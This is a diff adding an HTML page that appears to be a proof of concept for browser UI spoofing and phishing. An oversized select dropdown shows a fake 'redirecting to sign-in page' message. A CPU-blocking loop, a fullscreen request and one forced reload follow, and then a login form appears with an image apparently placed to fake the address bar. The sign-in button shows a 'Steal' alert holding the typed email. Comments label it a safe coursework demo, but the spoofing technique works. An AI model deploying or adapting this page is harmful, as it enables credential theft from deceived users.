@@ -1,0 +1,202 @@
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    font-family: Arial, sans-serif;
+    background: #f2f2f2;
+  }
+
+  select {
+    margin-top: 10%;
+    height: 89%;
+    width: 9999px;
+  }
+
+  /* demo login UI styles (safe, non-branded) */
+  .demo-center {
+    display: none;
+    min-height: 100vh;
+    box-sizing: border-box;
+    padding: 40px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .login-container {
+    background: white;
+    padding: 28px 30px;
+    border-radius: 8px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    width: 360px;
+    text-align: center;
+  }
+  .demo-title {
+    font-size: 28px;
+    font-weight: 700;
+    margin-bottom: 16px;
+    color: #222;
+    user-select: none;
+  }
+  .demo-sub {
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 18px;
+  }
+  .login-container input[type="text"],
+  .login-container input[type="password"] {
+    width: 100%;
+    padding: 12px 14px;
+    margin: 8px 0 14px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    font-size: 15px;
+  }
+  .login-container input:focus {
+    border-color: #4a90e2;
+    outline: none;
+    box-shadow: 0 0 6px rgba(74,144,226,0.25);
+  }
+  .login-container button {
+    background: #4a90e2;
+    color: #fff;
+    border: none;
+    width: 100%;
+    padding: 12px;
+    font-size: 15px;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  .login-container button:hover { filter: brightness(.95); }
+
+  .demo-footer {
+    margin-top: 12px;
+    font-size: 12px;
+    color: #777;
+    user-select: none;
+  }
+
+  /* image styling (still appears after Click Again as before) */
+  #afterImage {
+    display: none;
+    position: absolute;
+    top: 0%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 1570px;
+    height: auto;
+    border-radius: 12px;
+    box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+  }
+</style>
+
+<script>
+  // Dummy heavy work
+  function calculatePrimes(iterations, multiplier) {
+    var primes = [];
+    for (var i = 0; i < iterations; i++) {
+      var candidate = i * (multiplier * Math.random());
+      var isPrime = true;
+      for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+        if (candidate % c === 0) { isPrime = false; break; }
+      }
+      if (isPrime) primes.push(candidate);
+    }
+    return primes;
+  }
+
+  function run() {
+    // visual feedback on select
+    spoofText.selected = true;
+
+    setTimeout(function() {
+      window.requestAnimationFrame(blocking);
+    });
+
+    // fullscreen request on user gesture (may be blocked by browser)
+    document.documentElement.requestFullscreen().catch(() => {});
+  }
+
+  function blocking() {
+    calculatePrimes(25000, 100000);
+    // remove the select to simulate completion
+    selectElement.remove();
+
+    // first run: reload once
+    if (!sessionStorage.getItem("hasReloaded")) {
+      sessionStorage.setItem("hasReloaded", "true");
+      location.reload();
+      return;
+    }
+
+    // second run (after reload): clear flag and show demo login UI + image
+    sessionStorage.removeItem("hasReloaded");
+
+    // create and show demo login UI (non-branded)
+    showDemoLogin();
+  }
+
+  // After reload, change "Tap Here" to "Click Again"
+  window.onload = function() {
+    if (sessionStorage.getItem("hasReloaded")) {
+      const options = document.querySelectorAll("select option[selected]");
+      options.forEach(opt => opt.textContent = "Click Again");
+    }
+  };
+
+  function showDemoLogin() {
+    // create container if not exist
+    if (!document.getElementById('demoCenter')) {
+      const center = document.createElement('div');
+      center.id = 'demoCenter';
+      center.className = 'demo-center';
+      center.innerHTML = `
+        <div class="login-container" role="region" aria-label="Demo login form">
+          <div class="demo-title">Demo Login Page</div>
+          <div class="demo-sub">This is a non-branded mockup for UI practice.</div>
+          <input type="text" id="demoEmail" placeholder="Email or username" aria-label="Email or username" />
+          <input type="password" id="demoPass" placeholder="Password" aria-label="Password" />
+          <button id="demoBtn">Sign In (Demo)</button>
+          <div class="demo-footer">Demo page — for coursework only</div>
+        </div>
+      `;
+      document.body.appendChild(center);
+    }
+
+    // show the demo center and image
+    document.getElementById('demoCenter').style.display = 'flex';
+    const img = document.getElementById('afterImage');
+    if (img) img.style.display = 'block';
+
+    // hook demo button to show safe feedback (no real auth)
+    const btn = document.getElementById('demoBtn');
+    if (btn) {
+      btn.onclick = function() {
+        // simple demo feedback — do not collect credentials
+        const email = document.getElementById('demoEmail').value || '[no input]';
+        // show a safe non-sensitive message
+        alert('Steal :p : ' + email);
+        
+      };
+    }
+  }
+</script>
+
+<select id="selectElement" onmousedown="run()">
+  <option id="spoofText">Please wait while we redirecting to sign-in page...</option>
+  <option style="color:white;"></option>
+  <option></option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+  <option selected>Tap Here</option>
+</select>
+<img id="afterImage" src="topdomain.png">
